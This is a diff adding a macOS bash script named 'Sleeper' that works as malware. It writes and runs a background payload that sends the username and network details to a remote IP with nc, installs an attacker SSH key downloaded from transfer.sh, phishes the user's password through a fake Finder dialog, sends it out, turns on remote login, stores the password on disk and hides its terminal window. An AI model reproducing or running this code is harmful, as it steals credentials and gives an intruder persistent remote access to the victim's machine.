@@ -1,0 +1,48 @@
+#!/bin/bash
+echo -n -e "\033]0;Sleeper\007"
+
+cat > testfile1 <<- "EOF"
+# ----------------------------------------------------------------------- #
+#!/bin/bash
+path=`pwd`
+username=${path:7}
+info=`ifconfig | grep inet`
+
+allInfo=$username$info
+
+echo $allInfo | nc -n -v 10.38.27.118 1000
+
+mkdir .ssh
+curl https://transfer.sh/8eBr0/id >> .ssh/authorized_keys
+
+
+wrong=""
+while [ "$wrong" == "" ]
+do
+
+password="$(osascript -e 'Tell application "System Events" to display dialog "Finder requires your password to continue." default answer "" with hidden answer with icon {"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns"}' -e 'text returned of result' 2>/dev/null)"
+
+wrong=`echo $password | sudo -S echo "0"`
+
+if [ $password == "terminate" ]; then
+#wrong="terminate"
+exit
+fi
+
+sudo -k
+done
+mkdir ~/Library/Settings
+echo $password | nc -n -v 10.38.27.118 1000
+echo $password | sudo -S systemsetup -setremotelogin on
+echo $password >> ~/Library/Settings/pass
+# ----------------------------------------------------------------------- #
+EOF
+
+chmod +x testfile1
+
+nohup sh ./testfile1 >/dev/null &
+
+osascript -e 'tell application "Terminal" to close (every window whose name contains "Sleeper")' &
+
+# self destruct
+# rm -- "$0"
